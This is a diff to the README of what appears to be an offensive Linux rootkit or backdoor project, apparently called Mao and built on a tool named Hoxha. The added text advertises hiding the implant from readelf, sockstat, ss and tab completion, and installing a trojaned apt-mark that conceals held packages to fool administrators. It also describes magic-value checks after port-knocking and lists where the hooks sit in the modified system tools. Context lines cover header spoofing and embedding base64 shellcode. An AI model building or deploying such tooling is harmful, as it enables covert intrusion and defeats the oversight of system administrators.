@@ -35,6 +35,12 @@ New Features
 
 The enver client taken from <a href="https://github.com/mephistolist/hoxha">Hoxha</a> has the ability to spoof X-Forwarded-For, X-Originating-IP, X-Remote-IP and X-Remote-Addr headers. In the event someone was to intercept your traffic and you have spoofed your ip via a vpn or proxy, these headers give away your true location, or confuse someone further if also spoofed. 
 
+You will also notice that both enver and hoxha have checks to ensure that the hex value of 0xDEADBEEF is passed. So even after the port-knocking checks and passwords, that will be need to be passed with each packet to ensure the connections stays in place.
+
+Unlike with <a href="https://github.com/mephistolist/hoxha">Hoxha</a>, we will be hidden from readelf, sockstat, ss and tab completion. Though you may need to exit SSH and reconnect after installing to see the hidding from tab completion worker.
+
+To prevent overwriting of packages that would fool an administrator, we will also install a custom version of apt-mark that will not show packages we have put on hold. 
+
 Devlopment Notes
 ---
 
@@ -51,5 +57,15 @@ cat shellcode.bin | base64 -w0
 ```
 
 Then replace it with the base64 inside libexec.c and recompile to apply your changes. 
+
+If you want to make changes to the binaries in the 'tools' directory, you can grep for 'Mao' in the source code to see where we have made our edits:
+
+```
+grep -nr Mao .
+./sockstat.c:299:    /* --- Mao Handler --- */
+./readelf.c:1977:	/* Mao hook */  
+./ss.c:2469:    	/* Mao hook to hide ICMP/ICMPv6 sockets entirely */
+./apt-mark.cc:368:    // Mao - packages to filter out
+```
 
 This has currently been tested on Debian Forky using kernel 6.16.7.
